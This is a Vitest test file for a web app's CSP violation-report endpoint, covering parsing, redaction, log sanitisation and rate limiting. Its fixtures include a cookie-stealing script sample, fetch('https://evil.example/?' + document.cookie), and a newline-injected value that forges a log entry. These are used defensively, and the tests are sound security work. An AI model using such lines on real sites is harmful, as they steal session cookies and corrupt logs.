import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  CSP_REPORT_LIMIT,
  CSP_REPORT_MAX_BYTES,
  cspLogLine,
  parseCspReports,
  reduceBlocked,
  redactPath,
  resetCspReportLimit,
  takeCspReport,
} from "@/lib/security/csp-report";
import { POST } from "@/app/api/csp-report/route";

// BR-S-008: the collector an enforcing policy reports to. It is public by nature (a browser posts reports with no
// session), so these pin that whatever is posted becomes at most a bounded number of reduced, one-line log entries,
// and that the answer never varies.

const ORIGIN = "https://app.test";

const legacy = (over: Record<string, unknown> = {}) => ({
  "csp-report": {
    "document-uri": `${ORIGIN}/night-owl/videos?tab=1`,
    "blocked-uri": "https://evil.example/steal?c=secret",
    "effective-directive": "connect-src",
    "violated-directive": "connect-src",
    disposition: "enforce",
    "source-file": `${ORIGIN}/_next/static/chunks/app.js?v=1`,
    "line-number": 12,
    "column-number": 34,
    "script-sample": "fetch('https://evil.example/?' + document.cookie)",
    ...over,
  },
});

const reportingApi = (body: Record<string, unknown>) => [{ type: "csp-violation", url: `${ORIGIN}/`, age: 1, body }];

function post(body: string, type = "application/csp-report", headers: Record<string, string> = {}) {
  return new Request(`${ORIGIN}/api/csp-report`, { method: "POST", headers: { "content-type": type, ...headers }, body });
}

describe("parseCspReports: reduced to a closed shape", () => {
  it("reads the report-uri format and keeps nothing that could carry a secret", () => {
    const [v] = parseCspReports(legacy(), ORIGIN);
    expect(v).toEqual({
      directive: "connect-src",
      disposition: "enforce",
      blocked: "https://evil.example",
      page: "/night-owl/videos",
      source: `${ORIGIN}/_next/static/chunks/app.js`,
      line: 12,
      column: 34,
    });
    expect(JSON.stringify(v)).not.toContain("secret");
    expect(JSON.stringify(v)).not.toContain("cookie");
  });

  it("reads the Reporting API format", () => {
    const out = parseCspReports(
      reportingApi({ documentURL: `${ORIGIN}/pricing`, blockedURL: "inline", effectiveDirective: "script-src-elem", disposition: "report" }),
      ORIGIN,
    );
    expect(out).toEqual([
      { directive: "script-src-elem", disposition: "report", blocked: "inline", page: "/pricing", source: "", line: 0, column: 0 },
    ]);
  });

  it("drops a report about another site's page, and anything that is not a CSP report", () => {
    expect(parseCspReports(legacy({ "document-uri": "https://other.example/x" }), ORIGIN)).toEqual([]);
    expect(parseCspReports(legacy({ "document-uri": "not a url" }), ORIGIN)).toEqual([]);
    expect(parseCspReports([{ type: "deprecation", body: { documentURL: `${ORIGIN}/` } }], ORIGIN)).toEqual([]);
    expect(parseCspReports("x", ORIGIN)).toEqual([]);
    expect(parseCspReports(null, ORIGIN)).toEqual([]);
  });

  it("takes at most 20 reports from one body", () => {
    const many = Array.from({ length: 500 }, () => reportingApi({ documentURL: `${ORIGIN}/`, blockedURL: "eval" })[0]);
    expect(parseCspReports(many, ORIGIN)).toHaveLength(20);
  });

  it("redacts token-like path segments (review links, ids) and strips the query of signed URLs", () => {
    expect(redactPath("/r/AbCdEfGhIjKlMnOpQrStUvWxYz0123456789/video")).toBe("/r/:id/video");
    expect(redactPath("/night-owl/editor/3f2b8c1e-5d6a-4b7c-8d9e-0f1a2b3c4d5e")).toBe("/night-owl/editor/:id");
    expect(redactPath("/i/12345678")).toBe("/i/:id");
    expect(redactPath("/a%0Ab")).toBe("/:id");
    expect(reduceBlocked("https://x.supabase.co/storage/v1/object/sign/previews/a.mp4?token=eyJ.secret")).toBe("https://x.supabase.co");
    expect(reduceBlocked("data:image/png;base64,AAAA")).toBe("data:");
    expect(reduceBlocked("'inline'")).toBe("inline");
    expect(reduceBlocked("")).toBe("unknown");
    expect(reduceBlocked("::::")).toBe("unparsed");
  });

  it("rejects a directive or disposition outside the closed shape", () => {
    const [v] = parseCspReports(legacy({ "effective-directive": "x\n{\"event\":\"forged\"}", disposition: "maybe" }), ORIGIN);
    expect(v.directive).toBe("unknown");
    expect(v.disposition).toBe("unknown");
    const [w] = parseCspReports(legacy({ "line-number": -1, "column-number": "1e99" }), ORIGIN);
    expect([w.line, w.column]).toEqual([0, 0]);
  });

  it("writes one line of printable ASCII: a field cannot start another log entry", () => {
    const line = cspLogLine({
      directive: "script-src",
      disposition: "enforce",
      blocked: "https://a.example" + String.fromCharCode(0x2028),
      page: "/\r\nx",
      source: "",
      line: 1,
      column: 2,
    });
    expect([...line].some((ch) => ch.charCodeAt(0) < 0x20 || ch.charCodeAt(0) > 0x7e)).toBe(false);
    expect(JSON.parse(line).event).toBe("csp_violation");
  });
});

describe("the per-process ceiling", () => {
  beforeEach(() => resetCspReportLimit());

  it("allows CSP_REPORT_LIMIT.max lines a minute, then counts the rest and says so once the next minute starts", () => {
    const t0 = 1_000 * CSP_REPORT_LIMIT.windowMs;
    for (let i = 0; i < CSP_REPORT_LIMIT.max; i++) expect(takeCspReport(t0).ok).toBe(true);
    expect(takeCspReport(t0)).toEqual({ ok: false, droppedBefore: 0 });
    expect(takeCspReport(t0 + 1)).toEqual({ ok: false, droppedBefore: 0 });
    expect(takeCspReport(t0 + CSP_REPORT_LIMIT.windowMs)).toEqual({ ok: true, droppedBefore: 2 });
  });
});

describe("POST /api/csp-report", () => {
  let warn: ReturnType<typeof vi.spyOn>;
  const env = { ...process.env };
  beforeEach(() => {
    resetCspReportLimit();
    delete process.env.APP_ORIGIN;
    warn = vi.spyOn(console, "warn").mockImplementation(() => {});
  });
  afterEach(() => {
    warn.mockRestore();
    process.env = { ...env };
  });

  const lines = () => warn.mock.calls.map((c) => String(c[0]));

  it("logs one reduced line per violation and answers 204 with no body", async () => {
    const res = await POST(post(JSON.stringify(legacy())));
    expect(res.status).toBe(204);
    expect(await res.text()).toBe("");
    expect(res.headers.get("cache-control")).toBe("no-store");
    expect(lines()).toHaveLength(1);
    expect(JSON.parse(lines()[0])).toMatchObject({ event: "csp_violation", directive: "connect-src", blocked: "https://evil.example" });
    expect(lines()[0]).not.toContain("secret");
  });

  it("accepts the Reporting API content type", async () => {
    const body = JSON.stringify(reportingApi({ documentURL: `${ORIGIN}/`, blockedURL: "eval", effectiveDirective: "script-src" }));
    await POST(post(body, "application/reports+json"));
    expect(lines()).toHaveLength(1);
  });

  it("uses the deployment's public origin (APP_ORIGIN) to decide whose page a report is about", async () => {
    process.env.APP_ORIGIN = "https://nightshift.example";
    await POST(post(JSON.stringify(legacy())));
    expect(lines()).toHaveLength(0);
    await POST(post(JSON.stringify(legacy({ "document-uri": "https://nightshift.example/pricing" }))));
    expect(lines()).toHaveLength(1);
  });

  it("ignores another content type, broken JSON and a body over the cap, all with the same 204", async () => {
    for (const req of [
      post(JSON.stringify(legacy()), "text/plain"),
      post("{not json", "application/csp-report"),
      post(JSON.stringify(legacy({ pad: "x".repeat(CSP_REPORT_MAX_BYTES) }))),
      post(JSON.stringify(legacy()), "application/csp-report", { "content-length": String(CSP_REPORT_MAX_BYTES + 1) }),
    ]) {
      const res = await POST(req);
      expect(res.status).toBe(204);
    }
    expect(lines()).toHaveLength(0);
  });

  it("stops logging at the ceiling, and logs the dropped count once in the next minute", async () => {
    vi.useFakeTimers();
    try {
      vi.setSystemTime(5_000 * CSP_REPORT_LIMIT.windowMs);
      const body = JSON.stringify(Array.from({ length: 20 }, () => reportingApi({ documentURL: `${ORIGIN}/`, blockedURL: "eval" })[0]));
      for (let i = 0; i < 10; i++) await POST(post(body, "application/reports+json"));
      expect(lines().filter((l) => l.includes('"csp_violation"'))).toHaveLength(CSP_REPORT_LIMIT.max);
      vi.setSystemTime(5_001 * CSP_REPORT_LIMIT.windowMs);
      await POST(post(body, "application/reports+json"));
      expect(lines().filter((l) => l.includes("csp_violation_dropped"))).toHaveLength(1);
    } finally {
      vi.useRealTimers();
    }
  });
});
